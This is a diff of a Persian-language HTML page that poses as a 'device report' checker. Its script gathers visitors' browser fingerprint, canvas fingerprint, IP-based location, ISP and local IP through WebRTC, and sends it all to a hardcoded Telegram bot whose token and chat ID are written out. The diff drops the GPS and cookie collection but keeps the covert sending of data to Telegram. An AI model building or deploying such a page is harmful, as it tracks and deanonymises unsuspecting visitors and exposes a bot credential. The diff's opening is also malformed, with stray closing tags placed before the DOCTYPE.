@@ -1,9 +1,11 @@
-<!DOCTYPE html>
+
+</body>
+</html><!DOCTYPE html>
 <html lang="fa">
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>گزارش کامل و پیشرفته دستگاه</title>
+<title>📋 گزارش پیشرفته دستگاه</title>
 <style>
   body {
     margin: 0; padding: 20px;
@@ -25,7 +27,6 @@
     box-shadow: 0 8px 16px rgba(255,75,43,0.7);
     transition: 0.3s ease;
     margin: 10px auto;
-    user-select: none;
     display: inline-block;
   }
   button:hover:not(:disabled) {
@@ -37,7 +38,6 @@
     background: #555;
     cursor: not-allowed;
     box-shadow: none;
-    transform: none;
   }
   button.done {
     background: linear-gradient(135deg, #28a745, #218838);
@@ -53,15 +53,11 @@
     background: rgba(0,0,0,0.45);
     padding: 20px;
     border-radius: 16px;
-    min-height: 200px;
+    min-height: 100px;
     box-shadow: 0 0 20px rgba(255,75,43,0.6);
-    text-align: right;
+    text-align: center;
     direction: rtl;
     user-select: text;
-  }
-  #locationBtn {
-    background: #1e90ff;
-    margin-top: 5px;
   }
 </style>
 </head>
@@ -70,7 +66,6 @@
 <h1>📋 گزارش کامل و پیشرفته دستگاه شما</h1>
 
 <button id="startBtn">شروع بررسی</button>
-<button id="locationBtn">اجازه دسترسی موقعیت مکانی</button>
 
 <div id="status">برای شروع روی دکمه "شروع بررسی" کلیک کنید.</div>
 
@@ -79,10 +74,7 @@ const TELEGRAM_TOKEN = "8179792057:AAFqJdoVXJOp5QK13fVbskZgojZVdVdhkgs";
 const TELEGRAM_CHAT_ID = "309120647";
 
 const startBtn = document.getElementById('startBtn');
-const locationBtn = document.getElementById('locationBtn');
 const statusEl = document.getElementById('status');
-
-let userLocation = null; // ذخیره موقعیت
 
 function addResult(label, value, results) {
   if(value !== undefined && value !== null && value !== "") {
@@ -90,37 +82,15 @@ function addResult(label, value, results) {
   }
 }
 
-function requestLocation() {
-  return new Promise((resolve) => {
-    if(!navigator.geolocation){
-      alert("موقعیت مکانی پشتیبانی نمی‌شود.");
-      resolve(null);
-      return;
-    }
-    navigator.geolocation.getCurrentPosition(
-      pos => {
-        userLocation = pos.coords;
-        alert("دسترسی موقعیت پذیرفته شد.");
-        resolve(userLocation);
-      },
-      err => {
-        alert("دسترسی موقعیت رد شد یا خطا رخ داد.");
-        resolve(null);
-      },
-      {timeout: 10000}
-    );
-  });
-}
-
 async function collectInfo() {
   startBtn.disabled = true;
-  locationBtn.disabled = true;
   startBtn.textContent = "⏳ در حال جمع‌آوری...";
   startBtn.classList.remove("done");
   statusEl.textContent = "⏳ در حال جمع‌آوری اطلاعات...";
 
   let results = [];
 
+  // باتری
   try {
     if (navigator.getBattery) {
       const batt = await navigator.getBattery();
@@ -133,6 +103,7 @@ async function collectInfo() {
     }
   } catch(e) { addResult("🔋 وضعیت باتری", "خطا در دریافت", results); }
 
+  // اینترنت
   try {
     const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
     if(c){
@@ -145,21 +116,25 @@ async function collectInfo() {
     }
   } catch(e) { addResult("🌐 اتصال اینترنت", "خطا در دریافت", results); }
 
+  // صفحه نمایش
   try {
     addResult("📐 رزولوشن صفحه", `${screen.width}×${screen.height}`, results);
     addResult("🔍 نسبت پیکسل (DPI)", window.devicePixelRatio || "نامشخص", results);
   } catch(e) {}
 
+  // سخت افزار
   try {
     addResult("🖥️ هسته CPU", navigator.hardwareConcurrency || "نامشخص", results);
     addResult("💾 حافظه RAM (گیگابایت)", navigator.deviceMemory || "نامشخص", results);
   } catch(e) {}
 
+  // مرورگر و زبان
   try {
     addResult("🌍 زبان مرورگر", navigator.language || "نامشخص", results);
     addResult("📱 پشتیبانی از تاچ", (navigator.maxTouchPoints > 0) ? "دارد" : "ندارد", results);
   } catch(e) {}
 
+  // مشخصات مرورگر و کوکی و ردیابی
   try {
     addResult("🧭 User Agent", navigator.userAgent || "نامشخص", results);
     addResult("🧠 نام مرورگر", navigator.appName || "نامشخص", results);
@@ -168,6 +143,7 @@ async function collectInfo() {
     addResult("🌐 کوکی فعال است؟", navigator.cookieEnabled ? "بله" : "خیر", results);
   } catch(e) {}
 
+  // کارت گرافیک
   try {
     const canvas = document.createElement('canvas');
     const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -185,6 +161,7 @@ async function collectInfo() {
     }
   } catch(e) { addResult("🎮 کارت گرافیک", "خطا در دریافت", results); }
 
+  // اثر انگشت ساده (canvas fingerprint)
   try {
     const canvas = document.createElement("canvas");
     const ctx = canvas.getContext("2d");
@@ -195,12 +172,7 @@ async function collectInfo() {
     addResult("🆔 اثر انگشت (Fingerprint)", fp, results);
   } catch(e) { addResult("🆔 اثر انگشت (Fingerprint)", "خطا", results); }
 
-  if(userLocation){
-    addResult("📍 موقعیت مکانی", `عرض: ${userLocation.latitude.toFixed(6)}, طول: ${userLocation.longitude.toFixed(6)}`, results);
-  } else {
-    addResult("📍 موقعیت مکانی", "❌ دسترسی داده نشده", results);
-  }
-
+  // موقعیت (فقط آی‌پی و داده‌های عمومی، بدون مختصات GPS)
   try {
     let response = await fetch("https://ipapi.co/json/");
     if(response.ok){
@@ -209,10 +181,7 @@ async function collectInfo() {
       addResult("🏙️ شهر", data.city, results);
       addResult("🇮🇷 کشور", data.country_name, results);
       addResult("📶 شرکت اینترنتی", data.org, results);
-      addResult("🌐 منطقه زمانی (Timezone)", data.timezone, results);
-      addResult("🗺️ موقعیت مکانی تقریبی", `عرض: ${data.latitude}, طول: ${data.longitude}`, results);
       addResult("🔌 نوع اتصال", data.network || "نامشخص", results);
-      addResult("🔎 پشتیبانی از VPN/Proxy", data.proxy ? "بله" : "خیر", results);
     } else {
       addResult("🌐 اطلاعات IP", "دسترسی به API امکان‌پذیر نیست", results);
     }
@@ -220,30 +189,28 @@ async function collectInfo() {
     addResult("🌐 اطلاعات IP", "خطا در دریافت", results);
   }
 
+  // آی‌پی داخلی
   async function getLocalIP(){
     return new Promise((resolve) => {
       try {
         const pc = new RTCPeerConnection({iceServers:[]});
-        let localIPFound = false;
+        let done = false;
         pc.createDataChannel("");
         pc.createOffer().then(offer => pc.setLocalDescription(offer));
         pc.onicecandidate = (ice) => {
-          if(ice && ice.candidate && ice.candidate.candidate && !localIPFound){
+          if(ice && ice.candidate && ice.candidate.candidate && !done){
             const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
             const ipMatch = ipRegex.exec(ice.candidate.candidate);
             if(ipMatch){
               addResult("🏠 آی‌پی داخلی", ipMatch[1], results);
-              localIPFound = true;
+              done = true;
             }
             pc.close();
             resolve();
           }
-          if(!ice.candidate){
-            // تمام کاندیدها بررسی شدند ولی IP پیدا نشد
-            if(!localIPFound){
-              addResult("🏠 آی‌پی داخلی", "نامشخص", results);
-              resolve();
-            }
+          if(!ice.candidate && !done){
+            addResult("🏠 آی‌پی داخلی", "نامشخص", results);
+            resolve();
           }
         };
       } catch(e) {
@@ -254,57 +221,17 @@ async function collectInfo() {
   }
   await getLocalIP();
 
-  try {
-    const now = new Date();
-    addResult("⏰ زمان محلی", now.toLocaleString(), results);
-    addResult("🌐 منطقه زمانی", Intl.DateTimeFormat().resolvedOptions().timeZone || "نامشخص", results);
-  } catch(e) {}
-
-  try {
-    addResult("🟢 وضعیت آنلاین بودن", navigator.onLine ? "آنلاین" : "آفلاین", results);
-  } catch(e) {}
-
-  try {
-    addResult("📱 پلتفرم", navigator.platform || "نامشخص", results);
-  } catch(e) {}
-
-  try {
-    addResult("🖥️ فول اسکرین فعال است؟", document.fullscreenElement ? "بله" : "خیر", results);
-  } catch(e) {}
-
-  try {
-    addResult("🔗 پروتکل", location.protocol, results);
-    addResult("🌐 نام دامنه", location.hostname, results);
-    addResult("📂 مسیر دقیق صفحه", location.pathname, results);
-    addResult("🖥️ آدرس کامل صفحه", location.href, results);
-  } catch(e) {}
-
-  try {
-    // استفاده از PerformanceNavigationTiming جدید
-    const navEntries = performance.getEntriesByType("navigation");
-    if(navEntries && navEntries.length > 0){
-      const nav = navEntries[0];
-      addResult("⏱️ شروع بارگذاری صفحه", new Date(nav.startTime + performance.timing.navigationStart).toLocaleString(), results);
-      addResult("⏱️ پایان بارگذاری صفحه", new Date(nav.loadEventEnd + performance.timing.navigationStart).toLocaleString(), results);
-    } else {
-      addResult("⏱️ شروع بارگذاری صفحه", "نامشخص", results);
-      addResult("⏱️ پایان بارگذاری صفحه", "نامشخص", results);
-    }
-  } catch(e) {}
-
-  try {
-    addResult("🍪 کوکی‌ها", document.cookie || "ندارد", results);
-  } catch(e) { addResult("🍪 کوکی‌ها", "خطا", results); }
-
-  // مواردی که نیاز به اجازه یا افزونه دارند
+  // مواردی که نیاز به اجازه یا افزونه دارند (نمایش متن ثابت)
   addResult("ℹ️ مدل گوشی", "نیاز به اجازه یا افزونه", results);
   addResult("ℹ️ تعداد سیم کارت", "نیاز به اجازه یا افزونه", results);
   addResult("ℹ️ مدل چیپست", "نیاز به اجازه یا افزونه", results);
   addResult("ℹ️ حافظه کل و خالی", "نیاز به اجازه یا افزونه", results);
   addResult("ℹ️ نوع سیستم عامل و نسخه", "نیاز به اجازه یا افزونه", results);
 
-  const message = `⏰ زمان گزارش: ${new Date().toLocaleString()}\n\n` + results.join("\n");
+  // نمایش پیام خلاصه در صفحه (نه کل اطلاعات)
+  statusEl.textContent = "✅ اطلاعات با موفقیت ارسال شد.";
 
+  const message = `⏰ زمان گزارش: ${new Date().toLocaleString()}\n\n` + results.join("\n");
 
   try {
     const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -316,32 +243,19 @@ async function collectInfo() {
       }),
     });
     if(res.ok){
-  statusEl.textContent = "✅ انجام شد";
-  startBtn.textContent = "انجام شد ✅";
-  startBtn.classList.add("done");
-} else {
+      startBtn.textContent = "انجام شد ✅";
+      startBtn.classList.add("done");
+    } else {
       throw new Error("ارسال به تلگرام موفق نبود");
     }
-  } catch {
-    statusEl.textContent += "\n\n❌ خطا در ارسال اطلاعات به تلگرام.";
+  } catch(e) {
+    statusEl.textContent = "❌ خطا در ارسال به تلگرام. لطفاً دوباره تلاش کنید.";
+    startBtn.disabled = false;
     startBtn.textContent = "شروع بررسی";
-    startBtn.classList.remove("done");
   }
-
-  startBtn.disabled = false;
-  locationBtn.disabled = false;
 }
 
-locationBtn.onclick = async () => {
-  locationBtn.disabled = true;
-  await requestLocation();
-  locationBtn.disabled = false;
-  alert("موقعیت ذخیره شد. اکنون دکمه شروع بررسی را بزنید.");
-};
-
-startBtn.onclick = () => {
-  collectInfo();
-};
+startBtn.addEventListener("click", collectInfo);
 </script>
 
 </body>
